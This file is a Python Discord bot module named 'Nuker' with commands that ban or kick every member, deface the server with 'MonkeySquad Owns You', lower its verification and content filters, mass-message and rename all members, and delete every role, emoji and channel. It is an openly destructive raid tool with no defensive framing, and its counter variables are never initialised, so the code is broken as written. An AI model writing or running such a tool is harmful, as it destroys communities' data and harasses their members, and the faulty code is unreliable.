import disnake
from disnake.ext import commands


class Nuker(commands.Cog):

   def __init__(self, bot):
      self.bot = bot


   @commands.command(
      name="banall",
   )
   async def banall(self, interaction):
      for member in interaction.guild.members:
         await member.ban()
         bannedmembers += 1
      print(f"Banned {bannedmembers} members")
      
   @commands.command(
      name="kickall",
   )
   async def kickall(self, interaction):
      for member in interaction.guild.members:
         await member.kick()
         kickedmembers += 1
      print(f"Kicked {kickedmembers} members")
      
   #
   @commands.command(
      name="nukeserver"
   )
   async def nukeserver(self, interaction: disnake.ApplicationCommandInteraction):
      guild = interaction.guild
      await guild.edit(
         reason="MonkeySquad Owns You",
         name="MonkeySquad Owns You", 
         description="MonkeySquad Owns You", 
         icon=None, 
         banner=None, 
         splash=None, 
         discovery_splash=None, 
         community=False, 
         afk_channel=None,  
         afk_timeout=1, 
         default_notifications=disnake.NotificationLevel.all_messages, 
         verification_level=disnake.VerificationLevel.none, 
         explicit_content_filter=disnake.ContentFilter.disabled,
         vanity_code=None, 
         system_channel=None, 
         system_channel_flags=None,
         preferred_locale=disnake.Locale.zh_TW,
         rules_channel=None, 
         public_updates_channel=None, 
         premium_progress_bar_enabled=True
         )
      for member in interaction.guild.members:
         await member.ban()
         bannedmembers += 1
      print(f"Banned {bannedmembers} members")
   
   @commands.command(
      name="nickall"
   )
   async def nickall(self, interaction, *, arg):
      for member in interaction.guild.members:
         await member.edit(nick=arg)
         nicksedited += 1
      print(f"Edited {nicksedited} nick(s)")
      
   @commands.command(
      name="messageall"
   )
   async def messageall(self, interaction, *, arg):
      for member in interaction.guild.members:
         await member.send(arg)
         messagessent += 1
      print(f"Sent {messagessent} message(s)")
   
   @commands.command(
      name="clearroles"
   )
   async def clearroles(self, interaction):
      for role in interaction.guild.roles:
         await role.delete()
         rolesdeleted += 1
      print(f"Deleted {rolesdeleted} role(s)")
   
   @commands.command(
      name="clearemojis"
   )
   async def clearemojis(self, interaction):
      for emoji in interaction.guild.emojis:
         await emoji.delete()
         deletedemojis += 1
      print(f"Deleted {deletedemojis} emoji(s)")
      
   @commands.command(
      name="clearchannels"
   )
   async def clearchannels(self, interaction):
      for channel in interaction.guild.channels:
         await channel.delete()
         channelsdeleted += 1
      print(f"Deleted {channelsdeleted} channel(s)")
      
def setup(bot):
   bot.add_cog(Nuker(bot))
